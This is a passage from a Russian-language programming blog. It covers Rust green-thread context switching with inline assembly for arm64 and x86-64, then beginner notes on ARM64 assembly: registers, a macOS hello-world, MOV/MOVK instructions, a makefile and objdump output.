</span></span></code></pre></div><p>Мы будем работать с этой структурой используя ассемблер и хотим
быть уверены относительно того как она будет размещена в памяти.
Например, что первые 8 байт это содержимое регистра <code>SP</code>. Для
этого при описании структуры мы используем директиву
<a href="https://doc.rust-lang.org/nomicon/other-reprs.html#reprc"  class="external-link" target="_blank" rel="noopener">repr(C)</a>.</p>
<p>Нам нужна функция для переключения между потоками. Вот такую
реализацию можно использовать для arm64:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#728e00">unsafe</span> <span style="color:#728e00">fn</span> <span style="color:#d35400">thread_switch</span>(<span style="color:#434f54">new</span>: <span style="color:#728e00">*</span><span style="color:#728e00">const</span> <span style="color:#434f54">ThreadContext</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">asm!</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Загружаем сохранённый ранее указатель стека
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#7f8c8d">&#34;MOV SP, {}&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Считываем в ссылочный регистр LR адрес функции из
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#95a5a6">// области памяти, на которую указывает SP
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#7f8c8d">&#34;LDR LR, [SP], #16&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Прыгаем на функцию
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#7f8c8d">&#34;RET&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">in</span>(<span style="color:#434f54">reg</span>) (<span style="color:#728e00">*</span><span style="color:#434f54">new</span>).<span style="color:#434f54">sp</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Не уверен, что я делаю это правильно для arm64, но оно работает.
Для x86-64 это выглядело бы немного иначе:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span> <span style="color:#728e00">unsafe</span> <span style="color:#728e00">fn</span> <span style="color:#d35400">thread_switch</span>(<span style="color:#434f54">new</span>: <span style="color:#728e00">*</span><span style="color:#728e00">const</span> <span style="color:#434f54">ThreadContext</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">asm!</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#7f8c8d">&#34;MOV RSP, [{0} + 0x00]&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#7f8c8d">&#34;RET&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">in</span>(<span style="color:#434f54">reg</span>) <span style="color:#434f54">new</span>,
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Мы используем этот трюк, чтобы переключаться между функциями.
Инструкция <code>MOV RSP, {0}</code> загружает в регистр <code>RSP</code> адрес функции
на выполнение которой мы хотим переключиться, а <code>RET</code> передаёт
управление на адрес возврата, расположенный на вершине стека.</p>
<p>Для эксперимента нам нужна какая-нибудь тривиальная функция:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#728e00">fn</span> <span style="color:#d35400">foo</span>() -&gt; <span style="color:#728e00">!</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">println!</span>(<span style="color:#7f8c8d">&#34;foo&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">loop</span> {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#728e00">fn</span> <span style="color:#d35400">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#728e00">mut</span> <span style="color:#434f54">ctx</span> <span style="color:#728e00">=</span> <span style="color:#434f54">ThreadContext</span>::<span style="color:#434f54">default</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">let</span> <span style="color:#728e00">mut</span> <span style="color:#434f54">stack</span> <span style="color:#728e00">=</span> <span style="color:#434f54">vec!</span>[<span style="color:#8a7b52">0_</span><span style="color:#728e00">u8</span>; <span style="color:#434f54">SSIZE</span> <span style="color:#728e00">as</span> <span style="color:#00979d">usize</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">unsafe</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Мы знаем, что в x86-64 и в arm64 стек выровнен на 16 байт
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Указатель на байты стека (он растёт вниз)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#728e00">let</span> <span style="color:#434f54">stack_bottom</span> <span style="color:#728e00">=</span> <span style="color:#434f54">stack</span>.<span style="color:#434f54">as_mut_ptr</span>().<span style="color:#434f54">offset</span>(<span style="color:#434f54">SSIZE</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Получаем выровненный на 16-байт адрес стека
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#728e00">let</span> <span style="color:#434f54">sb_aligned</span> <span style="color:#728e00">=</span> (<span style="color:#434f54">stack_bottom</span> <span style="color:#728e00">as</span> <span style="color:#00979d">usize</span> <span style="color:#728e00">&amp;</span> <span style="color:#728e00">!</span><span style="color:#8a7b52">15</span>) <span style="color:#728e00">as</span> <span style="color:#728e00">*</span><span style="color:#728e00">mut</span> <span style="color:#00979d">u8</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Нам нужно записать 8 байт (64 бита),
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#95a5a6">// Поэтому приводим адрес foo и указатель на стек к u64
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Адрес нашей функции
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#728e00">let</span> <span style="color:#434f54">foo_src</span> <span style="color:#728e00">=</span> <span style="color:#434f54">foo</span> <span style="color:#728e00">as</span> <span style="color:#00979d">u64</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Смещаемся назад (вверх) на 16 байт
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#95a5a6">// (помним про выравнивание в x86-64 и arm64)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#728e00">let</span> <span style="color:#434f54">foo_dst</span> <span style="color:#728e00">=</span> <span style="color:#434f54">sb_aligned</span>.<span style="color:#434f54">offset</span>(<span style="color:#728e00">-</span><span style="color:#8a7b52">16</span>) <span style="color:#728e00">as</span> <span style="color:#728e00">*</span><span style="color:#728e00">mut</span> <span style="color:#00979d">u64</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#95a5a6">// Записываем в стек указатель на foo
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>        <span style="color:#434f54">std</span>::<span style="color:#434f54">ptr</span>::<span style="color:#434f54">write</span>(<span style="color:#434f54">foo_dst</span>, <span style="color:#434f54">foo_src</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">ctx</span>.<span style="color:#434f54">sp</span> <span style="color:#728e00">=</span> <span style="color:#434f54">sb_aligned</span>.<span style="color:#434f54">offset</span>(<span style="color:#728e00">-</span><span style="color:#8a7b52">16</span>) <span style="color:#728e00">as</span> <span style="color:#00979d">u64</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">thread_switch</span>(<span style="color:#728e00">&amp;</span><span style="color:#728e00">mut</span> <span style="color:#434f54">ctx</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Мы можем сделать <code>foo as u64</code> потому что функция это уже 64-битный указатель.
А вот эта строчка нужна, чтобы получить выровненный на 16 байт
указатель на стек:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#728e00">let</span> <span style="color:#434f54">sb_aligned</span> <span style="color:#728e00">=</span> (<span style="color:#434f54">stack_bottom</span> <span style="color:#728e00">as</span> <span style="color:#00979d">usize</span> <span style="color:#728e00">&amp;</span> <span style="color:#728e00">!</span><span style="color:#8a7b52">15</span>) <span style="color:#728e00">as</span> <span style="color:#728e00">*</span><span style="color:#728e00">mut</span> <span style="color:#00979d">u8</span>;
</span></span></code></pre></div><hr>
<p>Продолжение следует&hellip;</p>
<h2 id="assembly">
  Assembly <span class="tag"><span class="_assembly">@assembly</span><span class="assembly">assembly</span></span>
  <a class="heading-link" href="#assembly">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="arm64-assembly-1.ru-ru">
  <span class="org-todo done DONE">DONE</span> Программирование для ARM64. Часть 1 <span class="tag"><span class="_arm64">@arm64</span></span>
  <a class="heading-link" href="#arm64-assembly-1.ru-ru">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p><em>Заметка основана на конспектах из книги <a href="https://link.springer.com/book/10.1007/978-1-4842-5881-1"  class="external-link" target="_blank" rel="noopener">Programming
with 64-bit ARM Assembly Language</a>.</em></p>
<h4 id="регистры">
  Регистры
  <a class="heading-link" href="#%d1%80%d0%b5%d0%b3%d0%b8%d1%81%d1%82%d1%80%d1%8b">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<ul>
<li><code>X0-X30</code> &ndash; Регистры общего назначения.</li>
<li><code>X31</code>, <code>SP</code>, <code>XZR</code> &ndash; Указатель стека или нулевой регистр, в
зависимости от контекста.</li>
<li><code>X30</code>, <code>LR</code> &ndash; Ссылочный регистр. При вызове функции этот
регистр используется для хранения адреса возврата. Не
рекомендуется его использовать для чего-либо другого.</li>
<li><code>PC</code> &ndash; Счётчик инструкций. Хранит адрес по которому в памяти
расположена выполняемая в данный момент инструкция.</li>
</ul>
<p>Мы не всегда хотим использовать все 64 бита данных регистра,
иногда нам достаточно 32 бит. Поэтому существуют удобные
32-битные регистры <code>W0-W30</code> и <code>WZR</code>. Когда мы их используем, то
верхние 32 бита соответствующего 64-битного регистра
устанавливаются в 0.</p>
<h4 id="формат-инструкций">
  Формат инструкций
  <a class="heading-link" href="#%d1%84%d0%be%d1%80%d0%bc%d0%b0%d1%82-%d0%b8%d0%bd%d1%81%d1%82%d1%80%d1%83%d0%ba%d1%86%d0%b8%d0%b9">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Все инструкции имеют длину 32 бита. Остальное нам пока не очень
важно для практических целей (если только мы не собираемся
писать дизассемблер).</p>
<h4 id="тривиальная-программа">
  Тривиальная программа
  <a class="heading-link" href="#%d1%82%d1%80%d0%b8%d0%b2%d0%b8%d0%b0%d0%bb%d1%8c%d0%bd%d0%b0%d1%8f-%d0%bf%d1%80%d0%be%d0%b3%d1%80%d0%b0%d0%bc%d0%bc%d0%b0">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Рассмотрим &ldquo;привет мир&rdquo;.</p>
<ul>
<li><code>X0-X2</code> &ndash; Параметры системных вызовов.</li>
<li><code>X16</code> &ndash; Номер системного вызова.</li>
</ul>
<!--listend-->
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#95a5a6">; сообщаем линковщику где начинается программа
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#434f54">.global</span> <span style="color:#434f54">_start</span>
</span></span><span style="display:flex;"><span><span style="color:#95a5a6">; устанавливаем нужное выравнивание
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#434f54">.align</span> <span style="color:#8a7b52">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">_start:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">// печатаем
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOV</span> <span style="color:#434f54">X0</span>, <span style="color:#95a5a6">#1 ; куда печатать: 1 = stdout
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">ADR</span> <span style="color:#434f54">X1</span>, <span style="color:#434f54">helloworld</span> <span style="color:#95a5a6">; что печатать
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOV</span> <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#13 ; длина нашей строчки
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOV</span> <span style="color:#434f54">X16</span>, <span style="color:#95a5a6">#4 ; номер системного вызова &#34;write&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">SVC</span> <span style="color:#95a5a6">#0x80 ; делаем системный вызов
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">// выходим
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOV</span> <span style="color:#434f54">X0</span>, <span style="color:#95a5a6">#0 ; код 0
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOV</span> <span style="color:#434f54">X16</span>, <span style="color:#95a5a6">#1 ; номер системного вызова &#34;exit&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">SVC</span> <span style="color:#95a5a6">#0x80 ; просим ядро завершить программу
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">.data</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">helloworld:</span> <span style="color:#434f54">.ascii</span> <span style="color:#7f8c8d">&#34;Hello World!\n&#34;</span>
</span></span></code></pre></div><p>Вот так можно собрать:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>as -arch arm64 -o HelloWorld.o HelloWorld.s
</span></span><span style="display:flex;"><span>ld -o HelloWorld HelloWorld.o -lSystem -syslibroot <span style="color:#7f8c8d">`</span>xcrun -sdk macosx --show-sdk-path<span style="color:#7f8c8d">`</span> -e _start -arch arm64
</span></span></code></pre></div><h4 id="базовые-инструкции">
  Базовые инструкции
  <a class="heading-link" href="#%d0%b1%d0%b0%d0%b7%d0%be%d0%b2%d1%8b%d0%b5-%d0%b8%d0%bd%d1%81%d1%82%d1%80%d1%83%d0%ba%d1%86%d0%b8%d0%b8">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<!--list-separator-->
<ul>
<li>
<p>MOV/MOVK/MOVN</p>
<p>Существует несколько форм инструкций перемещения данных:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#d35400">MOVK</span> <span style="color:#434f54">XD</span>, <span style="color:#95a5a6">#imm16{, LSL #shift}
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#d35400">MOV</span> <span style="color:#434f54">XD</span>, <span style="color:#95a5a6">#imm16{, LSL #shift}
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#d35400">MOV</span> <span style="color:#434f54">XD</span>, <span style="color:#434f54">XS</span>
</span></span><span style="display:flex;"><span><span style="color:#d35400">MOV</span> <span style="color:#434f54">XD</span>, <span style="color:#434f54">operand2</span>
</span></span><span style="display:flex;"><span><span style="color:#d35400">MOVN</span> <span style="color:#434f54">XD</span>, <span style="color:#434f54">operand2</span>
</span></span></code></pre></div><p>Здесь:</p>
<ul>
<li><code>XD</code> и <code>XS</code> &ndash; Какие-то любые регистры.</li>
<li><code>#imm16</code> (<em>immediate value</em>) &ndash; Любой 16-битный числовой литерал.</li>
<li><code>operand2</code> &ndash; Про него ниже.</li>
</ul>
<p>Рассмотрим их по очереди.</p>
 <!--list-separator-->
<ul>
<li>
<p>MOVK (move keep)</p>
<p>Загружает 16-битное число в одну из 4-х позиций регистра, не
трогая остальные 48 бит. Например, если мы хотим загрузить число
<code>0x1234FEDC4F5D6E3A</code> в регистр <code>X2</code>, то мы можем это сделать
так:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#d35400">MOV</span> <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#0x6E3A
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#d35400">MOVK</span> <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#0x4F5D, LSL #16
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#d35400">MOVK</span> <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#0xFEDC, LSL #32
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#d35400">MOVK</span> <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#0x1234, LSL #48
</span></span></span></code></pre></div><p>В этом примере выше первая инструкция <code>MOV</code> это алиас <code>MOVZ</code>.
Инструкция <code>MOVZ</code> ведёт себя идентично <code>MOVK</code> за исключением
того, что она обнуляет остальные 48 бит.</p>
</li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>MOV (из регистра в регистр)</p>
<p>Копирует содержимое регистра <code>X2</code> в регистр <code>X1</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#d35400">MOV</span> <span style="color:#434f54">X1</span>, <span style="color:#434f54">X2</span>
</span></span></code></pre></div></li>
</ul>
 <!--list-separator-->
<ul>
<li>
<p>Что такое operand2</p>
<p>Все ARM-инструкции, которые работают с данными, имеют
опциональный параметр <code>operand2</code>. Он может быть в 3 формах:</p>
<ol>
<li><strong>Регистр и сдвиг</strong>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>   <span style="color:#d35400">MOV</span> <span style="color:#434f54">X1</span>, <span style="color:#434f54">X2</span>, <span style="color:#434f54">LSL</span> <span style="color:#95a5a6">#1 ; логический сдвиг влево
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>   <span style="color:#d35400">MOV</span> <span style="color:#434f54">X1</span>, <span style="color:#434f54">X2</span>, <span style="color:#434f54">LSR</span> <span style="color:#95a5a6">#1 ; логический сдвиг вправо
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>   <span style="color:#d35400">MOV</span> <span style="color:#434f54">X1</span>, <span style="color:#434f54">X2</span>, <span style="color:#434f54">ASR</span> <span style="color:#95a5a6">#1 ; арифметический сдвиг вправо
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>   <span style="color:#d35400">MOV</span> <span style="color:#434f54">X1</span>, <span style="color:#434f54">X2</span>, <span style="color:#434f54">ROR</span> <span style="color:#95a5a6">#1 ; сдвиг вправо (вращение)
</span></span></span></code></pre></div></li>
<li><strong>Регистр и расширение</strong>. Операции расширения позволяют нам
достать байт, половину или целое слово из второго регистра.
С инструкцией <code>MOV</code> расширения использовать нельзя, поэтому
приведём пример с <code>ADD</code>:
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>   <span style="color:#95a5a6">; X2 = X1 + SXTB(X0)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>   <span style="color:#d35400">ADD</span> <span style="color:#434f54">X2</span>, <span style="color:#434f54">X1</span>, <span style="color:#434f54">X0</span>, <span style="color:#434f54">SXTB</span>
</span></span></code></pre></div>Если можно было догадаться что делают сдвиги, то с <code>SXTB</code> и
другими расширениями уже не так очевидно. Сейчас не будем на
этом детально останавливаться. Надеюсь, что сможем изучить
как работают расширения позже.</li>
<li><strong>Число и сдвиг</strong>. Мы уже встречали эту форму, когда
разбирались с <code>MOVK</code>.
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>   <span style="color:#d35400">MOV</span> <span style="color:#434f54">X1</span>, <span style="color:#8a7b52">0xAB00</span>, <span style="color:#434f54">LSL</span> <span style="color:#95a5a6">#16
</span></span></span></code></pre></div></li>
</ol>
<p>Попробуем <code>MOV</code> на практике:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#434f54">.global</span> <span style="color:#434f54">_start</span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">.align</span> <span style="color:#8a7b52">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">_start:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">; помещаем число 0x1234FEDC4F5D6E3A в регистр X2
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOV</span> <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#0x6E3A
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOVK</span> <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#0x4F5D, LSL #16
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOVK</span> <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#0xFEDC, LSL #32
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOVK</span> <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#0x1234, LSL #48
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">; копируем содержимое W2 в W1
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOV</span> <span style="color:#434f54">W1</span>, <span style="color:#434f54">W2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">; пробуем мнемоники сдвигов и вращений
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">LSL</span>	<span style="color:#434f54">X1</span>, <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#1 ; логический сдвиг влево
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">LSR</span>	<span style="color:#434f54">X1</span>, <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#1 ; логический сдвиг вправо
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">ASR</span>	<span style="color:#434f54">X1</span>, <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#1 ; арифметический сдвиг вправо
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">ROR</span>	<span style="color:#434f54">X1</span>, <span style="color:#434f54">X2</span>, <span style="color:#95a5a6">#1 ; сдвиг вправо (вращение)
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">; выходим
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOV</span> <span style="color:#434f54">X0</span>, <span style="color:#95a5a6">#0 ; код 0
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">MOV</span> <span style="color:#434f54">X16</span>, <span style="color:#95a5a6">#1 ; номер системного вызова &#34;exit&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>  <span style="color:#d35400">SVC</span> <span style="color:#95a5a6">#0x80 ; просим ядро завершить программу
</span></span></span></code></pre></div><p>Пора начать использовать мейк-файлы:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-makefile" data-lang="makefile"><span style="display:flex;"><span><span style="color:#434f54">OBJS</span> <span style="color:#728e00">=</span> mov.o
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a61717">ifdef</span> <span style="color:#a61717">DEBUG</span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">DEBUGFLGS</span> <span style="color:#728e00">=</span> -g
</span></span><span style="display:flex;"><span><span style="color:#a61717">else</span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">DEBUGFLGS</span> <span style="color:#728e00">=</span>
</span></span><span style="display:flex;"><span><span style="color:#a61717">endif</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">LDFLAGS</span> <span style="color:#728e00">=</span> -lSystem -syslibroot <span style="color:#7f8c8d">`</span>xcrun -sdk macosx --show-sdk-path<span style="color:#7f8c8d">`</span> -e _start -arch arm64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#d35400">%.o </span><span style="color:#728e00">:</span> %.<span style="color:#434f54">s</span>
</span></span><span style="display:flex;"><span>	as <span style="color:#728e00">$(</span>DEBUGFLGS<span style="color:#728e00">)</span> $&lt; -o <span style="color:#434f54">$@</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#d35400">all</span><span style="color:#728e00">:</span> <span style="color:#434f54">mov</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#d35400">mov</span><span style="color:#728e00">:</span> <span style="color:#728e00">$(</span><span style="color:#434f54">OBJS</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>	ld -o mov <span style="color:#728e00">$(</span>LDFLAGS<span style="color:#728e00">)</span> <span style="color:#728e00">$(</span>OBJS<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#d35400">clean</span><span style="color:#728e00">:</span>
</span></span><span style="display:flex;"><span>	rm *.o mov
</span></span></code></pre></div><p>А теперь посмотрим что получилось <code>objdump</code>&lsquo;ом:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>objdump -s -d -M no-aliases mov.o
</span></span></code></pre></div><p>Покажет нам следующее:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mov.o:	file format mach-o arm64
</span></span><span style="display:flex;"><span>Contents of section __TEXT,__text:
</span></span><span style="display:flex;"><span> <span style="color:#8a7b52">0000</span> 42c78dd2 a2eba9f2 82dbdff2 8246e2f2  B............F..
</span></span><span style="display:flex;"><span> <span style="color:#8a7b52">0010</span> e103022a 41f87fd3 41fc41d3 41fc4193  ...*A...A.A.A.A.
</span></span><span style="display:flex;"><span> <span style="color:#8a7b52">0020</span> 4104c293 000080d2 300080d2 011000d4  A.......0.......
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Disassembly of section __TEXT,__text:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8a7b52">0000000000000000</span> &lt;ltmp0&gt;:
</span></span><span style="display:flex;"><span>       0: <span style="color:#8a7b52">42</span> c7 8d d2  	mov	x2, <span style="color:#95a5a6">#28218</span>
</span></span><span style="display:flex;"><span>       4: a2 eb a9 f2  	movk	x2, <span style="color:#95a5a6">#20317, lsl #16</span>
</span></span><span style="display:flex;"><span>       8: <span style="color:#8a7b52">82</span> db df f2  	movk	x2, <span style="color:#95a5a6">#65244, lsl #32</span>
</span></span><span style="display:flex;"><span>       c: <span style="color:#8a7b52">82</span> <span style="color:#8a7b52">46</span> e2 f2  	movk	x2, <span style="color:#95a5a6">#4660, lsl #48</span>
